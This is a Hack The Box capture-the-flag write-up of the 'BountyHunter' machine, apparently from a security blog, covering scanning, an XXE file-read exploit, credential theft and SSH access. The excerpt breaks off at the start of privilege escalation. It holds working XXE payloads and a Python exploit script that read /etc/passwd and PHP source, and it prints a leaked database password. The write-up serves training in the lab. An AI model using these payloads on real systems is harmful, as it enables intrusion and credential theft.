      <pubDate>Mon, 22 Nov 2021 21:31:31 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/bountyhunter/</guid>
      <description>BountyHunter features a website that is vulnerable to XXE attack. Exploiting it allows me to retrieve the user credentials from the source code. For the root part, there is an internal tool for ticket validation which can be exploited by leveraging the Python eval function to pops a root shell.
Skills Learned XXE attack Code injection Tools Nmap Burp Suite Reconnaissance Nmap A full tcp scan with nmap reveals two open ports: SSH and an Apache web server.</description>
      <content:encoded><![CDATA[<p>BountyHunter features a website that is vulnerable to XXE attack. Exploiting it allows me to retrieve the user credentials from the source code. For the root part, there is an internal tool for ticket validation which can be exploited by leveraging the Python eval function to pops a root shell.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>XXE attack</li>
<li>Code injection</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full tcp scan with <code>nmap</code> reveals two open ports: SSH and an Apache web server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «bountyhunter» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> -oA nmap/10-tcp-allport-bounty 10.10.11.100
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-29 12:49 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.100
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.060s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 48.51 seconds
</span></span><span class="line"><span class="cl">→ kali@kali «bountyhunter» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -p22,80 --min-rate <span class="m">1000</span> -oA nmap/10-tcp-allport-script-bounty 10.10.11.100
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-29 12:52 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.100
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.055s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Bounty Hunters
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 9.30 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 shows a portfolio website that is similar with one of the HTB web challenges: <a href="https://app.hackthebox.com/challenges/freelancer">Freelancer</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210730203525289.png" alt="image-20210730203525289"  title="Websites view"  /></div>
</p>
<p>Clicking on portal redirects to <code>/portal.php</code>, and the page is under development.</p>
<p><div class="img-container"><img src="imgs/image-20210730204150975.png" alt="image-20210730204150975"  /></div>
</p>
<p>Clicking the &lsquo;here&rsquo; text points to <code>/log_submit.php</code>. There is a form there and I can submit some inputs.</p>
<p><div class="img-container"><img src="imgs/image-20210730205749566.png" alt="image-20210730205749566"  /></div>
</p>
<p>By observing the traffic, I can see that the form data is submitted to <code>trackerdiRbpr00f314.php</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210730204826225.png" alt="image-20210730204826225"  /></div>
</p>
<p>It seems the submitted data is converted to an xml document and encoded in base64</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «bountyhunter» «10.10.14.29» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5kZG9zPC90aXRsZT4KCQk8Y3dlPmN3ZS01MDA8L2N3ZT4KCQk8Y3Zzcz4xMDwvY3Zzcz4KCQk8cmV3YXJkPjEkPC9yZXdhcmQ+CgkJPC9idWdyZXBvcnQ+&#39;</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl">&lt;?xml  <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&#34;ISO-8859-1&#34;</span>?&gt;
</span></span><span class="line"><span class="cl">                &lt;bugreport&gt;
</span></span><span class="line"><span class="cl">                &lt;title&gt;ddos&lt;/title&gt;
</span></span><span class="line"><span class="cl">                &lt;cwe&gt;cwe-500&lt;/cwe&gt;
</span></span><span class="line"><span class="cl">                &lt;cvss&gt;10&lt;/cvss&gt;
</span></span><span class="line"><span class="cl">                &lt;reward&gt;1$&lt;/reward&gt;
</span></span><span class="line"><span class="cl">                &lt;/bugreport&gt;
</span></span></code></pre></div><p>Further observation reveals a web directory which has directory listing enabled.</p>
<p><div class="img-container"><img src="imgs/image-20210730204030384.png" alt="image-20210730204030384"  /></div>
</p>
<p>The contents of <code>readme.txt</code> contains some to do list.</p>
<p><div class="img-container"><img src="imgs/image-20210730203939994.png" alt="image-20210730203939994"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="xxe">XXE</h3>
<h4 id="poc">PoC</h4>
<p>Seeing XML document submitted in base64 encoded leads to an assumption of XXE attack. I will use the following payload to test the attack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.29» 
</span></span><span class="line"><span class="cl">$ cat xxe1.test 
</span></span><span class="line"><span class="cl">&lt;?xml  <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&#34;ISO-8859-1&#34;</span>?&gt;
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE bugreport <span class="o">[</span>&lt;!ENTITY passwd SYSTEM <span class="s2">&#34;file:///etc/passwd&#34;</span> &gt;<span class="o">]</span> &gt;
</span></span><span class="line"><span class="cl">&lt;bugreport&gt;
</span></span><span class="line"><span class="cl"> &lt;title&gt;<span class="p">&amp;</span>passwd<span class="p">;</span>&lt;/title&gt;
</span></span><span class="line"><span class="cl"> &lt;cwe&gt;cwe-500&lt;/cwe&gt;
</span></span><span class="line"><span class="cl"> &lt;cvss&gt;10&lt;/cvss&gt;
</span></span><span class="line"><span class="cl"> &lt;reward&gt;1$&lt;/reward&gt;
</span></span><span class="line"><span class="cl">&lt;/bugreport&gt;
</span></span><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.29» 
</span></span><span class="line"><span class="cl">$ cat xxe1.test <span class="p">|</span> base64 -w <span class="m">0</span>   
</span></span><span class="line"><span class="cl">PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGJ1Z3JlcG9ydCBbPCFFTlRJVFkgcGFzc3dkIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIiA+XSA+CjxidWdyZXBvcnQ+CiA8dGl0bGU+JnBhc3N3ZDs8L3RpdGxlPgogPGN3ZT5jd2UtNTAwPC9jd2U+CiA8Y3Zzcz4xMDwvY3Zzcz4KIDxyZXdhcmQ+MSQ8L3Jld2FyZD4KPC9idWdyZXBvcnQ+Cg<span class="o">==</span>
</span></span></code></pre></div><p>I will intercept the submit request and put my payload there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/tracker_diRbPr00f314.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.100</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
</span></span><span class="line"><span class="cl"><span class="n">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">323</span>
</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://10.10.11.100</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://10.10.11.100/log_submit.php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGJ1Z3JlcG9ydCBbPCFFTlRJVFkgcGFzc3dkIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIiA%2bXSA%2bCjxidWdyZXBvcnQ%2bCiA8dGl0bGU%2bJnBhc3N3ZDs8L3RpdGxlPgogPGN3ZT5jd2UtNTAwPC9jd2U%2bCiA8Y3Zzcz4xMDwvY3Zzcz4KIDxyZXdhcmQ%2bMSQ8L3Jld2FyZD4KPC9idWdyZXBvcnQ%2bCg%3d%3d
</span></span></code></pre></div><p>When I submit, it returns with:</p>
<p><div class="img-container"><img src="imgs/image-20210730205835371.png" alt="image-20210730205835371"  /></div>
</p>
<p>It was vulnerable!</p>
<h3 id="shell-as-development">Shell as Development</h3>
<h4 id="file-read">File Read</h4>
<p>I created a Python script to exploit the XXE and grab the file contents.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">file_to_read</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Usage: </span><span class="si">%s</span><span class="s1"> &lt;file-to-read&gt;&#39;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">target_url</span> <span class="o">=</span> <span class="s2">&#34;http://10.10.11.100/tracker_diRbPr00f314.php&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="s2">&#34;http://127.0.0.1:8080&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
</span></span><span class="line"><span class="cl"><span class="n">xxe_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;!DOCTYPE bugreport [&lt;!ENTITY xxe SYSTEM &#34;file://</span><span class="si">{</span><span class="n">file_to_read</span><span class="si">}</span><span class="s2">&#34; &gt;]
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;bugreport&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2"> &lt;title&gt;&amp;xxe;&lt;/title&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2"> &lt;cwe&gt;cwe-500&lt;/cwe&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2"> &lt;cvss&gt;10&lt;/cvss&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2"> &lt;reward&gt;1$&lt;/reward&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/bugreport&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">xxe_payload_b64</span> <span class="o">=</span>  <span class="n">b64encode</span><span class="p">(</span><span class="n">xxe_payload</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#print(f&#34;[+] Crafted payload \n{xxe_payload_b64}&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="n">xxe_payload_b64</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">xxe_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="s2">&#34;cwe-500&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">xxe_resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Something went wrong&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
</span></span><span class="line"><span class="cl"><span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">xxe_resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&#34;lxml&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="p">[</span><span class="n">tag</span><span class="o">.</span><span class="n">text</span> <span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s2">&#34;td&#34;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span></code></pre></div><p>But when I try to use this script to read PHP files, it fails</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.29» 
</span></span><span class="line"><span class="cl">$ python3 bountyhunters_xxe.py /var/www/html/index.php           
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Something went wrong
</span></span></code></pre></div><p>This time I modified the script and used the PHP wrapper.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">...</span><span class="p">[</span><span class="n">SNIP</span><span class="p">]</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span> <span class="n">bugreport</span> <span class="p">[</span><span class="o">&lt;</span><span class="err">!</span><span class="n">ENTITY</span> <span class="n">xxe</span> <span class="n">SYSTEM</span> <span class="s2">&#34;php://filter/convert.base64-encode/resource=</span><span class="si">{file_to_read}</span><span class="s2">&#34;</span> <span class="o">&gt;</span><span class="p">]</span> <span class="o">&gt;</span> 
</span></span><span class="line"><span class="cl"><span class="o">...</span><span class="p">[</span><span class="n">SNIP</span><span class="p">]</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
</span></span><span class="line"><span class="cl"><span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">xxe_resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&#34;lxml&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="p">[</span><span class="n">tag</span><span class="o">.</span><span class="n">text</span> <span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s2">&#34;td&#34;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">b64decode</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">))</span>
</span></span></code></pre></div><p>And it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.29» 
</span></span><span class="line"><span class="cl">$ python3 bountyhunters_xxe_filter.py /var/www/html/tracker_diRbPr00f314.php
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;data&#39;</span><span class="o">]))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl"><span class="nv">$xml</span> <span class="o">=</span> base64_decode<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;data&#39;</span><span class="o">])</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">libxml_disable_entity_loader<span class="o">(</span><span class="nb">false</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dom</span> <span class="o">=</span> new DOMDocument<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dom</span>-&gt;loadXML<span class="o">(</span><span class="nv">$xml</span>, LIBXML_NOENT <span class="p">|</span> LIBXML_DTDLOAD<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$bugreport</span> <span class="o">=</span> simplexml_import_dom<span class="o">(</span><span class="nv">$dom</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">?&gt;
</span></span><span class="line"><span class="cl">If DB were ready, would have added:
</span></span><span class="line"><span class="cl">&lt;table&gt;
</span></span><span class="line"><span class="cl">  &lt;tr&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;Title:&lt;/td&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;&lt;?php <span class="nb">echo</span> <span class="nv">$bugreport</span>-&gt;title<span class="p">;</span> ?&gt;&lt;/td&gt;
</span></span><span class="line"><span class="cl">  &lt;/tr&gt;
</span></span><span class="line"><span class="cl">  &lt;tr&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;CWE:&lt;/td&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;&lt;?php <span class="nb">echo</span> <span class="nv">$bugreport</span>-&gt;cwe<span class="p">;</span> ?&gt;&lt;/td&gt;
</span></span><span class="line"><span class="cl">  &lt;/tr&gt;
</span></span><span class="line"><span class="cl">  &lt;tr&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;Score:&lt;/td&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;&lt;?php <span class="nb">echo</span> <span class="nv">$bugreport</span>-&gt;cvss<span class="p">;</span> ?&gt;&lt;/td&gt;
</span></span><span class="line"><span class="cl">  &lt;/tr&gt;
</span></span><span class="line"><span class="cl">  &lt;tr&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;Reward:&lt;/td&gt;
</span></span><span class="line"><span class="cl">    &lt;td&gt;&lt;?php <span class="nb">echo</span> <span class="nv">$bugreport</span>-&gt;reward<span class="p">;</span> ?&gt;&lt;/td&gt;
</span></span><span class="line"><span class="cl">  &lt;/tr&gt;
</span></span><span class="line"><span class="cl">&lt;/table&gt;
</span></span></code></pre></div><p>There is a database connection file (<code>/var/www/html/db.php</code>) that contains DB credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.29» 
</span></span><span class="line"><span class="cl">$ python3 bountyhunters_xxe_filter.py /var/www/html/db.php   
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">// TODO -&gt; Implement login system with the database.
</span></span><span class="line"><span class="cl"><span class="nv">$dbserver</span> <span class="o">=</span> <span class="s2">&#34;localhost&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">&#34;bounty&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dbusername</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dbpassword</span> <span class="o">=</span> <span class="s2">&#34;m19RoAU0hP41A1sTsq6K&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$testuser</span> <span class="o">=</span> <span class="s2">&#34;test&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">?&gt;
</span></span></code></pre></div><h4 id="ssh">SSH</h4>
<p>The database password works on user <code>development</code> (from <code>/etc/passwd</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> kali@kali «exploits» «10.10.14.29» 
</span></span><span class="line"><span class="cl">$ ssh development@10.10.11.100
</span></span><span class="line"><span class="cl">development@10.10.11.100<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.2 LTS <span class="o">(</span>GNU/Linux 5.4.0-80-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System information as of Fri <span class="m">30</span> Jul <span class="m">2021</span> 03:28:24 PM UTC
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:           0.0
</span></span><span class="line"><span class="cl">  Usage of /:            38.4% of 6.83GB
</span></span><span class="line"><span class="cl">  Memory usage:          30%
</span></span><span class="line"><span class="cl">  Swap usage:            0%
</span></span><span class="line"><span class="cl">  Processes:             <span class="m">214</span>
</span></span><span class="line"><span class="cl">  Users logged in:       <span class="m">1</span>
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> eth0: 10.10.11.100
</span></span><span class="line"><span class="cl">  IPv6 address <span class="k">for</span> eth0: dead:beef::250:56ff:feb9:cb7f
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Fri Jul <span class="m">30</span> 13:44:59 <span class="m">2021</span> from 10.10.14.42
</span></span><span class="line"><span class="cl">development@bountyhunter:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>development<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>development<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>development<span class="o">)</span>
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>At current home directory, there are some plain text files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">development@bountyhunter:~$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">12</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root        root        <span class="m">471</span> Jun <span class="m">15</span> 16:10 contract.txt
</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> root        development  <span class="m">33</span> Jul <span class="m">30</span> 05:20 user.txt
</span></span></code></pre></div><p>The content of <code>contract.txt</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">development@bountyhunter:~$ cat contract.txt 
</span></span><span class="line"><span class="cl">Hey team,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">I<span class="s1">&#39;ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">This has been our first job since the &#34;rm -rf&#34; incident and we can&#39;</span>t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">I <span class="nb">set</span> up the permissions <span class="k">for</span> you to <span class="nb">test</span> this. Good luck.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-- John
</span></span></code></pre></div><p>This user also has sudo permissions on the mentioned internal tool called <code>ticketValidator.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">development@bountyhunter:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> development on bountyhunter:
